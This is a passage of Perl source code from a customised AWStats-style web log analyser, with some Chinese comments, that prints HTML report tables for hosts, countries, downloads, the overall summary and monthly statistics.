			print "<td>" . Format_Bytes( $_host_k{$key} ) . "</td>\n";
		}
		if ( $ShowHostsStats =~ /L/i ) {
			print "<td>"
			  . (
				$_host_l{$key}
				? Format_Date( $_host_l{$key}, 1 )
				: '-'
			  )
			  . "</td>\n";
		}
		print "</tr>\n";
		$total_p += $_host_p{$key};
		$total_h += $_host_h{$key};
		$total_k += $_host_k{$key} || 0;
		$count++;
	}
	if ($Debug) {
		debug( "Total real / shown : $TotalPages / $total_p - $TotalHits / $total_h - $TotalBytes / $total_h", 2 );
	}
	$rest_p = $TotalPages - $total_p;
	$rest_h = $TotalHits - $total_h;
	$rest_k = $TotalBytes - $total_k;
	# All other visitors (known or not)
	if ( ($rest_p > 0 || $rest_h > 0 || $rest_k > 0) && $count >= 10 ) {    
		print "<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Failed to obtain IP data") . "</span></td>\n";
		&HTMLShowHostInfo('');
		if ( $ShowHostsStats =~ /P/i ) { print "<td>" . ( $rest_p ? Format_Number($rest_p) : "&nbsp;" ) . "</td>\n"; }
		if ( $ShowHostsStats =~ /H/i ) { print "<td>".Format_Number($rest_h)."</td>\n"; }
		if ( $ShowHostsStats =~ /B/i ) { print "<td>" . Format_Bytes($rest_k) . "</td>\n"; }
		if ( $ShowHostsStats =~ /L/i ) { print "<td>&nbsp;</td>\n"; }
		print "</tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Domains details frame or static page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowDomains{
	my $total_p = 0;
	my $total_h = 0;
	my $total_k = 0;
	my $total_v = 0;
	my $total_u = 0;
	my $rest_p = 0;
	my $rest_h = 0;
	my $rest_k = 0;
	my $rest_v = 0;
	my $rest_u = 0;
	print "$Center<a name=\"domains\">&nbsp;</a>";

	# Show domains list
	my $title = '';
	my $cpt   = 0;
	if ( $HTMLOutput{'alldomains'} ) {
		$title .= _t("Countries");
		$cpt = ( scalar keys %_domener_h );
	}
	&tab_head( "$title", 19, 0, 'domains' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th width=\"$WIDTHCOLICON\">" . _t("flag_icon") . "</th><th>" . _t("Country-Region-City") . "</th><th>" . _t("Code") . "</th>\n";
	if ( $ShowDomainsStats =~ /U/i ) {
		print "<th bgcolor=\"#$color_u\" width=\"80\">" . _t("Unique visitors") . "</th>\n";
	}
	if ( $ShowDomainsStats =~ /V/i ) {
		print "<th bgcolor=\"#$color_v\" width=\"80\">" . _t("Visits") . "</th>\n";
	}
	if ( $ShowDomainsStats =~ /P/i ) {
		print "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th>\n";
	}
	if ( $ShowDomainsStats =~ /H/i ) {
		print "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>\n";
	}
	if ( $ShowDomainsStats =~ /B/i ) {
		print "<th class=\"datasize\" bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th>\n";
	}
	print "<th>&nbsp;</th>";
	print "</tr>\n";
	$total_u = $total_v = $total_p = $total_h = $total_k = 0;
	my $max_h = 1;
	foreach ( values %_domener_h ) {
		if ( $_ > $max_h ) { $max_h = $_; }
	}
	my $max_k = 1;
	foreach ( values %_domener_k ) {
		if ( $_ > $max_k ) { $max_k = $_; }
	}
	my $count = 0;
	&BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_domener_h,
		\%_domener_p );
	foreach my $key (@keylist) {
		my ( $_domener_u, $_domener_v );
		my $bredde_p = 0;
		my $bredde_h = 0;
		my $bredde_k = 0;
		if ( $max_h > 0 ) {
			$bredde_p =
			  int( $BarWidth * $_domener_p{$key} / $max_h ) + 1;
		}    # use max_h to enable to compare pages with hits
		if ( $_domener_p{$key} && $bredde_p == 1 ) { $bredde_p = 2; }
		if ( $max_h > 0 ) {
			$bredde_h =
			  int( $BarWidth * $_domener_h{$key} / $max_h ) + 1;
		}
		if ( $_domener_h{$key} && $bredde_h == 1 ) { $bredde_h = 2; }
		if ( $max_k > 0 ) {
			$bredde_k =
			  int( $BarWidth * ( $_domener_k{$key} || 0 ) / $max_k ) +
			  1;
		}
		if ( $_domener_k{$key} && $bredde_k == 1 ) { $bredde_k = 2; }
		my $newkey = lc($key);

		# 获取显示用的完整位置和国家代码
		my $display_name = '';
		my $country_code = '';
		if (exists $TmpDomainFullLocation{$newkey}) {
			$display_name = $TmpDomainFullLocation{$newkey}->{display};
			$country_code = $TmpDomainFullLocation{$newkey}->{code};
		} else {
			# 回退：将键名中的下划线转回空格
			$display_name = $key;
			$display_name =~ s/_/ /g;
			# 提取国家名称并尝试查找代码
			my $country_name = '';
			if ($display_name =~ /^([^,]+),/) {
				$country_name = $1;
			} else {
				$country_name = $display_name;
			}
			# 通过国家名称查找代码
			foreach my $code (keys %DomainsHashIDLib) {
				if (lc($DomainsHashIDLib{$code}) eq lc($country_name)) {
					$country_code = $code;
					last;
				}
			}
			$country_code = lc(substr($country_name, 0, 2)) unless $country_code;
		}

		if ( $newkey eq 'ip' || !$DomainsHashIDLib{$newkey} ) {
			print "<tr><td width=\"$WIDTHCOLICON\" style=\"text-align:center; vertical-align:middle;\">" . country_code_to_emoji($country_code) . "<\/td><td class=\"aws\">$display_name<\/td><td class=\"aws\">" . uc($country_code) . "<\/td>";
		}
		else {
			print "<tr><td width=\"$WIDTHCOLICON\" style=\"text-align:center; vertical-align:middle;\">" . country_code_to_emoji($country_code) . "<\/td><td class=\"aws\">$display_name<\/td><td class=\"aws\">" . uc($country_code) . "<\/td>";
		}

		## to add unique visitors and number of visits, by Josep Ruano @ CAPSiDE
		if ( $ShowDomainsStats =~ /U/i ) {
			$_domener_u = (
				  $_domener_p{$key}
				? $_domener_p{$key} / $TotalPages
				: 0
			);
			$_domener_u += ( $_domener_h{$key} / $TotalHits );
			$_domener_u =
			  sprintf( "%.0f", ( $_domener_u * $TotalUnique ) / 2 );
			print "<td>".Format_Number($_domener_u)." ("
			  . sprintf( "%.1f%", 100 * $_domener_u / $TotalUnique )
			  . ")</td>\n";
		}
		if ( $ShowDomainsStats =~ /V/i ) {
			$_domener_v = (
				  $_domener_p{$key}
				? $_domener_p{$key} / $TotalPages
				: 0
			);
			$_domener_v += ( $_domener_h{$key} / $TotalHits );
			$_domener_v =
			  sprintf( "%.0f", ( $_domener_v * $TotalVisits ) / 2 );
			print "<td>".Format_Number($_domener_v)." ("
			  . sprintf( "%.1f%", 100 * $_domener_v / $TotalVisits )
			  . ")</td>\n";
		}
		if ( $ShowDomainsStats =~ /P/i ) {
			print "<td>".Format_Number($_domener_p{$key})."</td>\n";
		}
		if ( $ShowDomainsStats =~ /H/i ) {
			print "<td>".Format_Number($_domener_h{$key})."</td>\n";
		}
		if ( $ShowDomainsStats =~ /B/i ) {
			print "<td>" . Format_Bytes( $_domener_k{$key} ) . "</td>\n";
		}
		print "<td class=\"aws\">";
		if ( $ShowDomainsStats =~ /P/i ) {
			print "<div style=\"background-color: #$color_p; width: ${bredde_p}px; height: 5px; border-radius: 3px;\" title=\"" . _t("Pages") . ": " . int( $_domener_p{$key} ) . "\"></div>";
		}
		if ( $ShowDomainsStats =~ /H/i ) {
			print "<div style=\"background-color: #$color_h; width: ${bredde_h}px; height: 5px; border-radius: 3px;\" title=\"" . _t("Hits") . ": " . int( $_domener_h{$key} ) . "\"></div>";
		}
		if ( $ShowDomainsStats =~ /B/i ) {
			print "<div style=\"background-color: #$color_k; width: ${bredde_k}px; height: 5px; border-radius: 3px;\" title=\"" . _t("Bandwidth") . ": " . Format_Bytes( $_domener_k{$key} ) . "\"></div>";
		}
		print "</td>\n";
		print "</tr>\n";
		$total_u += $_domener_u;
		$total_v += $_domener_v;
		$total_p += $_domener_p{$key};
		$total_h += $_domener_h{$key};
		$total_k += $_domener_k{$key} || 0;
		$count++;
	}
	$rest_u = $TotalUnique - $total_u;
	$rest_v = $TotalVisits - $total_v;
	$rest_p = $TotalPages - $total_p;
	$rest_h = $TotalHits - $total_h;
	$rest_k = $TotalBytes - $total_k;
	if (   $rest_u > 0
		|| $rest_v > 0
		|| $rest_p > 0
		|| $rest_h > 0
		|| $rest_k > 0 )
	{    # All other domains (known or not)
		print "<tr><td width=\"$WIDTHCOLICON\">&nbsp;</td><td colspan=\"2\" class=\"aws\"><span style=\"color: #$color_other\">" . _t("Failed to obtain the relevant data") . "</span></td>\n";
		if ( $ShowDomainsStats =~ /U/i ) { print "<td>$rest_u</td>\n"; }
		if ( $ShowDomainsStats =~ /V/i ) { print "<td>$rest_v</td>\n"; }
		if ( $ShowDomainsStats =~ /P/i ) { print "<td>$rest_p</td>\n"; }
		if ( $ShowDomainsStats =~ /H/i ) { print "<td>$rest_h</td>\n"; }
		if ( $ShowDomainsStats =~ /B/i ) {
			print "<td>" . Format_Bytes($rest_k) . "</td>\n";
		}
		print "<td class=\"aws\">&nbsp;</td>\n";
		print "</tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Downloads code frame or static page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowDownloads{
	my $regext = qr/\.(\w{1,6})$/;
	print "$Center<a name=\"downloads\">&nbsp;</a>";
	
	# 使用与 Main 函数相同的标题（但不需要 Full list 链接）
	my $title = _t("Downloads");
	if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
		$title .= " &nbsp; - &nbsp; <a href=\"" 
			. (XMLEncode( "$AddLinkToExternalCGIWrapper" 
			. "?section=DOWNLOADS&baseName=$DirData/$PROG"
			. "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
			. "&siteConfig=$SiteConfig" )
			. "\" target=\"_blank\">" . _t("Export") . "</a>");
	}
	
	&tab_head( "$title", 19, 0, "downloads" );
	my $total_dls = scalar keys %_downloads;
	print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
	print "<th colspan=\"2\">" . _t("Downloads") . ": $total_dls</th>";
	if ( $ShowDownloadsStats =~ /H/i ){
		print "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>\n";
		print "<th bgcolor=\"#$color_h\" width=\"100\">" . _t("Pause & Go") . "</th>\n";
	}
	if ( $ShowDownloadsStats =~ /B/i ){
		print "<th bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th>\n";
		print "<th bgcolor=\"#$color_k\" width=\"80\">" . _t("Average") . "</th>\n";
	}
	if ( $ShowDownloadsStats =~ /C/i ){
		print "<th bgcolor=\"#$color_c\" width=\"80\">" . _t("Complete") . "</th>\n";
	}
	if ( $ShowDownloadsStats =~ /M/i ){
		print "<th bgcolor=\"#$color_m\" width=\"80\">" . _t("Mobile") . "</th>\n";
	}
	if ( $ShowDownloadsStats =~ /T/i ){
		print "<th bgcolor=\"#$color_t\" width=\"80\">" . _t("Last") . "</th>\n";
	}
	print "<th>&nbsp;</th>";
	print "<\/tr>";
	my $count = 0;
	my $Totalh = 0;
	
	# 先计算总点击数用于百分比
	for my $u (keys %_downloads) {
		$Totalh += $_downloads{$u}->{'AWSTATS_HITS'} || 0;
	}
	
	for my $u (sort {$_downloads{$b}->{'AWSTATS_HITS'} <=> $_downloads{$a}->{'AWSTATS_HITS'}}(keys %_downloads) ) {
		print "<tr valign=\"middle\">";
		
		# 图标列
		my $ext = Get_Extension($regext, $u);
		if ( !$ext) {
			print "<td class=\"aws\" width=\"$WIDTHCOLICON\" align=\"center\">"
				. "<img src=\"$DirIcons\/mime\/unknown.svg\""
				. AltTitle("")
				. " width=\"24\" height=\"auto\" style=\"vertical-align:middle; object-fit:contain;\" />"
				. "<\/td>";
		}
		else {
			my $nameicon = $MimeHashLib{$ext}[0] || "notavailable";
			print "<td class=\"aws\" width=\"$WIDTHCOLICON\" align=\"center\">"
				. "<img src=\"$DirIcons\/mime\/$nameicon.svg\""
				. AltTitle("")
				. " width=\"24\" height=\"auto\" style=\"vertical-align:middle; object-fit:contain;\" />"
				. "<\/td>";
		}
		
		# 文件名列
		print "<td class=\"aws\">";
		&HTMLShowURLInfo($u);
		print "<\/td>";
		
		# Hits 统计
		if ( $ShowDownloadsStats =~ /H/i ){
			my $hits = $_downloads{$u}->{'AWSTATS_HITS'} || 0;
			my $hits206 = $_downloads{$u}->{'AWSTATS_206'} || 0;
			print "<td class=\"aws\" bgcolor=\"#$color_h\" align=\"right\">" . Format_Number($hits) . "<\/td>";
			print "<td class=\"aws\" bgcolor=\"#$color_h\" align=\"right\">" . Format_Number($hits206) . "<\/td>";
		}
		
		# 带宽统计
		if ( $ShowDownloadsStats =~ /B/i ){
			my $size = $_downloads{$u}->{'AWSTATS_SIZE'} || 0;
			my $total_ops = ($_downloads{$u}->{'AWSTATS_HITS'} || 0) + ($_downloads{$u}->{'AWSTATS_206'} || 0);
			my $avg = $total_ops > 0 ? $size / $total_ops : 0;
			print "<td class=\"aws\" bgcolor=\"#$color_k\" align=\"right\" nowrap=\"nowrap\">" . Format_Bytes($size) . "<\/td>";
			print "<td class=\"aws\" bgcolor=\"#$color_k\" align=\"right\" nowrap=\"nowrap\">" . Format_Bytes($avg) . "<\/td>";
		}
		
		# 完成率
		if ( $ShowDownloadsStats =~ /C/i ){
			my $hits = $_downloads{$u}->{'AWSTATS_HITS'} || 0;
			my $hits206 = $_downloads{$u}->{'AWSTATS_206'} || 0;
			my $complete = $hits - $hits206;
			my $rate = $hits > 0 ? int($complete / $hits * 100) : 0;
			print "<td class=\"aws\" bgcolor=\"#$color_c\" align=\"right\">"
				. Format_Number($complete) . " ($rate%)"
				. "<\/td>";
		}
		
		# 移动设备统计
		if ( $ShowDownloadsStats =~ /M/i ){
			my $mobile = $_downloads{$u}->{'AWSTATS_MOBILE'} || 0;
			my $pct = $Totalh > 0 ? int($mobile / $Totalh * 100) : 0;
			print "<td class=\"aws\" bgcolor=\"#$color_m\" align=\"right\">"
				. Format_Number($mobile) . " ($pct%)"
				. "<\/td>";
		}
		
		# 最后下载时间
		if ( $ShowDownloadsStats =~ /T/i ){
			my $last = $_downloads{$u}->{'AWSTATS_LAST_TIME'} || 0;
			print "<td class=\"aws\" bgcolor=\"#$color_t\" align=\"right\" nowrap=\"nowrap\">"
				. ($last ? Format_Date($last, 1) : '-')
				. "<\/td>";
		}
		
		# 进度条（基于完成率）
		my $hits = $_downloads{$u}->{'AWSTATS_HITS'} || 0;
		my $hits206 = $_downloads{$u}->{'AWSTATS_206'} || 0;
		my $complete_rate = $hits > 0 ? ($hits - $hits206) / $hits : 0;
		my $bar_width = int($BarWidth * $complete_rate);
		$bar_width = 2 if $bar_width == 1 && $complete_rate > 0;
		
		print "<td class=\"aws\">";
		if ($ShowDownloadsStats) {
			print "<div style=\"background-color: #$color_p; width: ${bar_width}px; height: 8px; border-radius: 4px;\" title=\"" . _t("Complete rate") . ": " . int($complete_rate * 100) . "%\"></div>";
		}
		print "<\/td>";
		
		print "<\/tr>";
		$count++;
		if ($count >= $MaxRowsInHTMLOutput){last;}
	}
	my $rest_hits = 0;
	my $rest_206 = 0;
	my $rest_size = 0;
	my $rest_mobile = 0;
	my $displayed_count = 0;
	
	for my $u (keys %_downloads) {
		if ($displayed_count >= $MaxRowsInHTMLOutput) {
			$rest_hits += $_downloads{$u}->{'AWSTATS_HITS'} || 0;
			$rest_206 += $_downloads{$u}->{'AWSTATS_206'} || 0;
			$rest_size += $_downloads{$u}->{'AWSTATS_SIZE'} || 0;
			$rest_mobile += $_downloads{$u}->{'AWSTATS_MOBILE'} || 0;
		}
		$displayed_count++;
	}
	
	if ($rest_hits > 0) {
		print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
		print "<td colspan=\"2\" class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others") . "</span><\/td>";
		if ( $ShowDownloadsStats =~ /H/i ){
			print "<td bgcolor=\"#$color_h\" align=\"right\">" . Format_Number($rest_hits) . "<\/td>";
			print "<td bgcolor=\"#$color_h\" align=\"right\">" . Format_Number($rest_206) . "<\/td>";
		}
		if ( $ShowDownloadsStats =~ /B/i ){
			print "<td bgcolor=\"#$color_k\" align=\"right\" nowrap=\"nowrap\">" . Format_Bytes($rest_size) . "<\/td>";
			my $avg = $rest_hits + $rest_206 > 0 ? $rest_size / ($rest_hits + $rest_206) : 0;
			print "<td bgcolor=\"#$color_k\" align=\"right\" nowrap=\"nowrap\">" . Format_Bytes($avg) . "<\/td>";
		}
		if ( $ShowDownloadsStats =~ /C/i ){
			print "<td bgcolor=\"#$color_c\" align=\"right\">&nbsp;<\/td>";
		}
		if ( $ShowDownloadsStats =~ /M/i ){
			print "<td bgcolor=\"#$color_m\" align=\"right\">&nbsp;<\/td>";
		}
		if ( $ShowDownloadsStats =~ /T/i ){
			print "<td bgcolor=\"#$color_t\" align=\"right\">&nbsp;<\/td>";
		}
		print "<td>&nbsp;<\/td>";
		print "<\/tr>";
	}
	
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Summary section at the top of the main page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainSummary{
	if ($Debug) { debug( "ShowSummary", 2 ); }
	# FirstTime LastTime
	my $FirstTime = 0;
	my $LastTime  = 0;
	foreach my $key ( keys %FirstTime ) {
		my $keyqualified = 0;
		if ( $MonthRequired eq 'all' ) { $keyqualified = 1; }
		if ( $key =~ /^$YearRequired$MonthRequired/ ) { $keyqualified = 1; }
		if ($keyqualified) {
			if ( $FirstTime{$key}
				&& ( $FirstTime == 0 || $FirstTime > $FirstTime{$key} ) )
			{
				$FirstTime = $FirstTime{$key};
			}
			if ( $LastTime < ( $LastTime{$key} || 0 ) ) {
				$LastTime = $LastTime{$key};
			}
		}
	}
			
	#print "$Center<a name=\"summary\">&nbsp;</a>";
	my $title = "📊 " . _t("Report Overview");
	&tab_head( "$title", 0, 0, 'month' );

	my $NewLinkParams = ${QueryString};
	$NewLinkParams =~ s/(^|&|&amp;)update(=\w*|$)//i;
	$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\w*|$)//i;
	$NewLinkParams =~ s/(^|&|&amp;)year=[^&]*//i;
	$NewLinkParams =~ s/(^|&|&amp;)month=[^&]*//i;
	$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;
	$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
	$NewLinkParams =~ s/^&amp;//;
	$NewLinkParams =~ s/&amp;$//;
	if ($NewLinkParams) { $NewLinkParams = "${NewLinkParams}&amp;"; }
	my $NewLinkTarget = '';

	if ( $FrameName eq 'mainright' ) {
		$NewLinkTarget = " target=\"_parent\"";
	}

	# Ratio
	my $RatioVisits = 0;
	my $RatioPages  = 0;
	my $RatioHits   = 0;
	my $RatioBytes  = 0;
	if ( $TotalUnique > 0 ) {
		$RatioVisits = int( $TotalVisits / $TotalUnique * 100 ) / 100;
	}
	if ( $TotalVisits > 0 ) {
		$RatioPages = int( $TotalPages / $TotalVisits * 100 ) / 100;
	}
	if ( $TotalVisits > 0 ) {
		$RatioHits = int( $TotalHits / $TotalVisits * 100 ) / 100;
	}
	if ( $TotalVisits > 0 ) {
		$RatioBytes =
		  int( ( $TotalBytes / 1024 ) * 100 /
			  ( $LogType eq 'M' ? $TotalHits : $TotalVisits ) ) / 100;
	}

	my $colspan = 5;
	my $w       = '20';
	if ( $LogType eq 'W' || $LogType eq 'S' ) {
		$w       = '17';
		$colspan = 6;
	}

	# Show first/last
	print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
	print "<td class=\"aws\"><b>" . _t("Period") . "</b></td><td class=\"aws\" colspan=\""
	  . ( $colspan - 1 ) . "\">";
	if ($MonthRequired eq 'all') {
		my $year_display = $YearRequired;
		if (defined &FormatYear_localdate) {
			$year_display = FormatYear_localdate($YearRequired, $Lang);
		} else {
			$year_display = sprintf(_t("date_format_year"), $YearRequired);
		}
		print $year_display;
	} else {
		my $month_display;
		if (defined &FormatMonth_localdate) {
			$month_display = FormatMonth_localdate($MonthRequired, $YearRequired, $Lang);
		} else {
			$month_display = sprintf(_t("date_format_month"), $MonthNumLib{$MonthRequired}, $YearRequired);
		}
		print $month_display;
	}
	print "</td>\n</tr>\n";
	print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
	print "<td class=\"aws\"><b>" . _t("First visit") . "</b></td>\n";
	print "<td class=\"aws\" colspan=\""
	  . ( $colspan - 1 ) . "\">"
	  . ( $FirstTime ? Format_Date( $FirstTime, 0 ) : "NA" ) . "</td>\n";
	print "</tr>\n";
	print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
	print "<td class=\"aws\"><b>" . _t("Last visit") . "</b></td>\n";
	print "<td class=\"aws\" colspan=\""
	  . ( $colspan - 1 ) . "\">"
	  . ( $LastTime ? Format_Date( $LastTime, 0 ) : "NA" )
	  . "</td>\n";
	print "</tr>\n";

	# Show main indicators title row
	print "<tr>";
	if ( $LogType eq 'W' || $LogType eq 'S' ) {
		print "<td bgcolor=\"#$color_TableBGTitle\">&nbsp;</td>\n";
	}
	if ( $ShowSummary =~ /U/i ) {
		print "<td width=\"$w%\" bgcolor=\"#$color_u\""
		  . Tooltip(2)
		  . ">" . _t("Unique visitors") . "</td>\n";
	}
	else {
		print "<td bgcolor=\"#$color_TableBGTitle\" width=\"20%\">&nbsp;</td>\n";
	}
	if ( $ShowSummary =~ /V/i ) {
		print "<td width=\"$w%\" bgcolor=\"#$color_v\""
		  . Tooltip(1)
		  . ">" . _t("Visits") . "</td>\n";
	}
	else {
		print "<td bgcolor=\"#$color_TableBGTitle\" width=\"20%\">&nbsp;</td>\n";
	}
	if ( $ShowSummary =~ /P/i ) {
		print "<td width=\"$w%\" bgcolor=\"#$color_p\""
		  . Tooltip(3)
		  . ">" . _t("Pages") . "</td>\n";
	}
	else {
		print "<td bgcolor=\"#$color_TableBGTitle\" width=\"20%\">&nbsp;</td>\n";
	}
	if ( $ShowSummary =~ /H/i ) {
		print "<td width=\"$w%\" bgcolor=\"#$color_h\""
		  . Tooltip(4)
		  . ">" . _t("Hits") . "</td>\n";
	}
	else {
		print "<td bgcolor=\"#$color_TableBGTitle\" width=\"20%\">&nbsp;</td>\n";
	}
	if ( $ShowSummary =~ /B/i ) {
		print "<td width=\"$w%\" bgcolor=\"#$color_k\""
		  . Tooltip(5)
		  . ">" . _t("Bandwidth") . "</td>\n";
	}
	else {
		print "<td bgcolor=\"#$color_TableBGTitle\" width=\"20%\">&nbsp;</td>\n";
	}
	print "</tr>\n";

	# Show main indicators values for viewed traffic
	print "<tr>";
	if ( $LogType eq 'M' ) {
		print "<td class=\"aws\">" . _t("Viewed") . "</td>\n";
		print "<td>&nbsp;<br>&nbsp;</td>\n";
		print "<td>&nbsp;<br>&nbsp;</td>\n";
		if ( $ShowSummary =~ /H/i ) {
			print "<td><b>".Format_Number($TotalHits)."</b>"
			  . (
				$LogType eq 'M'
				? ""
				: "<br>($RatioHits&nbsp;"
				  . _t("Hits") . "/" . _t("Visits") . ")"
			  )
			  . "</td>\n";
		}
		else { print "<td>&nbsp;</td>\n"; }
		if ( $ShowSummary =~ /B/i ) {
			print "<td><b>"
			  . Format_Bytes( int($TotalBytes) )
			  . "</b><br>($RatioBytes&nbsp;" . _t("KB/Visits") . ")</td>\n";
		}
		else { print "<td>&nbsp;</td>\n"; }
	}
	else {
		if ( $LogType eq 'W' || $LogType eq 'S' ) {
			print "<td class=\"aws\">" . _t("Normal browsing traffic") . "</td>\n";
		}
		if ( $ShowSummary =~ /U/i ) {
			print "<td>"
			  . (
				$MonthRequired eq 'all'
				? "<b>&lt;= ".Format_Number($TotalUnique)."</b><br>" . _t("Unique")
				: "<b>".Format_Number($TotalUnique)."</b><br>&nbsp;"
			  )
			  . "</td>\n";
		}
		else { print "<td>&nbsp;</td>\n"; }
		if ( $ShowSummary =~ /V/i ) {
			print "<td><b>".Format_Number($TotalVisits)."</b><br>(" . $RatioVisits . "&nbsp;" . _t("Visits/Visitor") . ")</td>\n";
		}
		else { print "<td>&nbsp;</td>\n"; }
		if ( $ShowSummary =~ /P/i ) {
			print "<td><b>".Format_Number($TotalPages)."</b><br>(" . $RatioPages . "&nbsp;"
			  . _t("Pages/Visit") . ")</td>\n";
		}
		else { print "<td>&nbsp;</td>\n"; }
		if ( $ShowSummary =~ /H/i ) {
			print "<td><b>".Format_Number($TotalHits)."</b>"
			  . (
				$LogType eq 'M'
				? ""
				: "<br>(" . $RatioHits . "&nbsp;"
				  . _t("Hits/Visit") . ")"
			  )
			  . "</td>\n";
		}
		else { print "<td>&nbsp;</td>\n"; }
		if ( $ShowSummary =~ /B/i ) {
			print "<td><b>"
			  . Format_Bytes( int($TotalBytes) )
			  . "</b><br>(" . $RatioBytes . "&nbsp;" . _t("KB/Visit") . ")</td>\n";
		}
		else { print "<td>&nbsp;</td>\n"; }
	}
	print "</tr>\n";

	# Show main indicators values for not viewed traffic values
	if ( $LogType eq 'M' || $LogType eq 'W' || $LogType eq 'S' ) {
		print "<tr>";
		if ( $LogType eq 'M' ) {
			print "<td class=\"aws\">" . _t("Not viewed") . "</td>\n";
			print "<td>&nbsp;<br>&nbsp;</td>\n";
			print "<td>&nbsp;<br>&nbsp;</td>\n";
			if ( $ShowSummary =~ /H/i ) {
				print "<td><b>".Format_Number($TotalNotViewedHits)."</b></td>\n";
			}
			else { print "<td>&nbsp;</td>\n"; }
			if ( $ShowSummary =~ /B/i ) {
				print "<td><b>"
				  . Format_Bytes( int($TotalNotViewedBytes) )
				  . "</b></td>\n";
			}
			else { print "<td>&nbsp;</td>\n"; }
		}
		else {
			if ( $LogType eq 'W' || $LogType eq 'S' ) {
				print "<td class=\"aws\">" . _t("Abnormal browsing traffic") . "</td>\n";
			}
			print "<td colspan=\"2\">&nbsp;<br>&nbsp;</td>\n";
			if ( $ShowSummary =~ /P/i ) {
				print "<td><b>".Format_Number($TotalNotViewedPages)."</b></td>\n";
			}
			else { print "<td>&nbsp;</td>\n"; }
			if ( $ShowSummary =~ /H/i ) {
				print "<td><b>".Format_Number($TotalNotViewedHits)."</b></td>\n";
			}
			else { print "<td>&nbsp;</td>\n"; }
			if ( $ShowSummary =~ /B/i ) {
				print "<td><b>"
				  . Format_Bytes( int($TotalNotViewedBytes) )
				  . "</b></td>\n";
			}
			else { print "<td>&nbsp;</td>\n"; }
		}
		print "</tr>\n";
	}
	&tab_end($LogType eq 'W' || $LogType eq 'S' ? "* " . _t("Abnormal browsing traffic note") : "" );
}

#------------------------------------------------------------------------------
# Function:     Prints the Monthly section on the main page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainMonthly{
	if ($Debug) { debug( "ShowMonthStats", 2 ); }
	print "$Center<a name=\"month\">&nbsp;</a>";
	my $title = "📊 " . _t("Monthly Statistics");
	&tab_head( "$title", 0, 0, 'month' );
	print "<tr><td align=\"center\">";
	print "<center>";

	my $average_nb = my $average_u = my $average_v = my $average_p = 0;
	my $average_h = my $average_k = 0;
	my $total_u = my $total_v = my $total_p = my $total_h = my $total_k = 0;
	my $max_u = my $max_v = my $max_p = my $max_h = my $max_k = 1;

	# 获取最大月份数（支持第13个月）
	my $max_month = 12;
	if (defined &GetMaxMonth_localdate) {
		$max_month = GetMaxMonth_localdate($Lang);
	}

	# Define total and max
	for ( my $ix = 1 ; $ix <= $max_month ; $ix++ ) {
		my $monthix = sprintf( "%02s", $ix );
		$total_u += $MonthUnique{ $YearRequired . $monthix } || 0;
		$total_v += $MonthVisits{ $YearRequired . $monthix } || 0;
		$total_p += $MonthPages{ $YearRequired . $monthix }  || 0;
		$total_h += $MonthHits{ $YearRequired . $monthix }   || 0;
		$total_k += $MonthBytes{ $YearRequired . $monthix }  || 0;

		if ( ( $MonthUnique{ $YearRequired . $monthix } || 0 ) > $max_u ) {
			$max_u = $MonthUnique{ $YearRequired . $monthix };
		}
		if ( ( $MonthVisits{ $YearRequired . $monthix } || 0 ) > $max_v ) {
			$max_v = $MonthVisits{ $YearRequired . $monthix };
		}
		if ( ( $MonthPages{ $YearRequired . $monthix } || 0 ) > $max_p ) {
			$max_p = $MonthPages{ $YearRequired . $monthix };
		}
		if ( ( $MonthHits{ $YearRequired . $monthix } || 0 ) > $max_h ) {
			$max_h = $MonthHits{ $YearRequired . $monthix };
		}
		if ( ( $MonthBytes{ $YearRequired . $monthix } || 0 ) > $max_k ) {
			$max_k = $MonthBytes{ $YearRequired . $monthix };
		}
	}

	# Show bars for month
	my $graphdone=0;
	foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
	{
		my @blocklabel = ();
		for ( my $ix = 1 ; $ix <= $max_month ; $ix++ ) {
			my $monthix = sprintf( "%02s", $ix );
			my $month_name;
			if (defined &FormatMonth_localdate) {
				$month_name = FormatMonth_localdate($monthix, $YearRequired, $Lang, 1);
			} else {
				$month_name = sprintf(_t("date_format_month"), $MonthNumLib{$monthix}, $YearRequired);
			}
			push @blocklabel, "$month_name\n$YearRequired";
		}
		my @vallabel = (
			_t("Unique visitors"), _t("Visits"),
			_t("Pages"), _t("Hits"),
			_t("Bandwidth")
		);
		my @valcolor =
		  ( "$color_u", "$color_v", "$color_p", "$color_h",
			"$color_k" );
		my @valmax = ( $max_u, $max_v, $max_p, $max_h, $max_k );
		my @valtotal =
		  ( $total_u, $total_v, $total_p, $total_h, $total_k );
		my @valaverage = ();
		my @valdata = ();
		my $xx      = 0;
		for ( my $ix = 1 ; $ix <= $max_month ; $ix++ ) {
			my $monthix = sprintf( "%02s", $ix );
